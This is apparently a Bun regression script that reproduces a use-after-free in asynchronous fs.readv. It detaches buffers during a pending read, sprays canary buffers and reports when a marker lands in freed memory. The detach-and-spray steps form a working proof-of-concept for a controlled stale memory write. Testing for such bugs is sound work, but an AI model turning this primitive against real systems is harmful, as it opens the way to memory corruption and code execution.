import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 256);
const viewsPerCall = Number(process.env.VIEWS_PER_CALL || 4);
const viewSize = Number(process.env.VIEW_SIZE || 2048);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const path = join(tmpdir(), `bun-async-readv-canary-${process.pid}`);

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

const fd = fs.openSync(path, fs.constants.O_RDWR);
const marker = Buffer.from("BUN_STALE_READV_CANARY_MARKER");
const payload = Buffer.alloc(viewsPerCall * viewSize, 0x46);
marker.copy(payload, 0);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone(ab, { transfer: [ab] });
}

function gcNow() {
  if (typeof Bun?.gc === "function") Bun.gc(true);
}

function allocateCanaries() {
  return Array.from({ length: sprayCount }, () => {
    const view = new Uint8Array(new ArrayBuffer(viewSize));
    view.fill(0x7b);
    return view;
  });
}

function findMarker(canaries) {
  for (let i = 0; i < canaries.length; i++) {
    const view = canaries[i];
    let ok = true;
    for (let j = 0; j < marker.length; j++) {
      if (view[j] !== marker[j]) {
        ok = false;
        break;
      }
    }
    if (ok) return i;
  }
  return -1;
}

async function runOne(i) {
  const buffers = Array.from({ length: viewsPerCall }, () => new Uint8Array(new ArrayBuffer(viewSize)));
  const backingStores = buffers.map((view) => view.buffer);
  const done = new Promise((resolve) => {
    fs.readv(fd, buffers, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  buffers.length = 0;
  for (const ab of backingStores) detach(ab);
  gcNow();
  const canaries = allocateCanaries();
  fs.writeSync(fd, payload, 0, payload.length);

  const result = await done;
  const index = findMarker(canaries);
  if (index !== -1) {
    console.error(`[fs.readv:canary] controlled stale write observed iteration=${i} canary=${index} bytesRead=${result.bytesRead}`);
    return true;
  }
  return false;
}

try {
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      process.exitCode = 86;
      break;
    }
    if (i % 16 === 0) console.error(`[fs.readv:canary] progress=${i}`);
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}

console.error("[fs.readv:canary] done");
